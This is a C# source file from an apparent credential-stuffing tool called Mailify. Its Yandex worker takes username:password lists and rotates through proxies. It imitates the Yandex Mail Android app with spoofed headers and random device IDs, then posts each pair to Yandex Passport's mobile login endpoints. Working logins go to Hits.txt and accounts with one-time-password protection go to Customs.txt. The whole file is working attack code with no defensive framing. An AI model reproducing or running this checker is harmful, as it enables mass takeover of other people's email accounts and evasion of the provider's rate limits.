using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Security.Authentication;

namespace Mailify
{
    internal class Yandex
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);

        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    string USER = Http.RandomUserAgent();
                    string RND = Functions.RandomString("?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h");
                    request.AllowAutoRedirect = false;
                    request.SslProtocols = SslProtocols.Tls12;
                    request.AddHeader("User-Agent", "" + USER + "");
                    request.AddHeader("Connection", "Keep-Alive");
                    request.AddHeader("Accept-Encoding", "gzip");

                    var res0 = request.Get("https://mobile.yandexadexchange.net/v1/startup?uuid=" + RND + "&screen_width=540&screen_height=960&scalefactor=2.0&dnt=0&device_type=phone&os_name=android&os_version=6.0.1&manufacturer=LGE&model=LGM-Z240V&locale=en_US&app_id=ru.yandex.mail&app_version=79771&app_version_name=6.1.1&screen_dpi=320&sdk_version=2.91");
                    string text0 = res0.ToString();

                    request.AllowAutoRedirect = false;
                    request.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; LGM-Z240V Build/P0U94X)");
                    request.AddHeader("Connection", "Keep-Alive");
                    request.AddHeader("Accept-Encoding", "gzip");

                    var res1 = request.Post("https://mobileproxy.passport.yandex.net/2/bundle/mobile/start/?device_id=" + RND + "&manufacturer=LGE&am_app=ru.yandex.mail%206.1.1&app_id=ru.yandex.mail&am_version_name=7.16.0%28716001851%29&uuid=" + RND + "&model=LGM-Z240V&app_version_name=6.1.1&deviceid=" + RND + "&app_platform=Android%206.0.1%20%28REL%29", "login=" + credentials[0] + "&force_register=false&is_phone_number=false&x_token_client_id=" + RND + "&x_token_client_secret=" + RND + "&client_id=" + RND + "&client_secret=" + RND + "&display_language=en&payment_auth_retpath=https://passport.yandex.com/closewebview", "application/x-www-form-urlencoded");
                    string text1 = res1.ToString();


                    if (text1.Contains("account.not_found"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (text1.Contains("otp"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text1.Contains(credentials[0]))
                    {
                        var TRACK_ID = Functions.JSON(text1, "track_id").FirstOrDefault();
                        request.AllowAutoRedirect = false;
                        request.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; LGM-Z240V Build/P0U94X)");
                        request.AddHeader("Connection", "Keep-Alive");
                        request.AddHeader("Accept-Encoding", "gzip");

                        var res2 = request.Post("https://mobileproxy.passport.yandex.net/1/bundle/mobile/auth/password/?device_id=" + RND + "", "track_id=" + TRACK_ID + "&password=" + credentials[1] + "&password_source=Login", "application/x-www-form-urlencoded");
                        string text2 = res2.ToString();
                        if (text2.Contains("\"display_login\": \""))
                        {
                            Variables.Valid++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                if (Config.kekr_UI == "LOG")
                                {
                                    Console.WriteLine($"[+] {combo}", Color.Green);
                                }
                                File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                            }
                        }
                        else
                        {
                            Variables.Invalid++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                            }
                        }
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}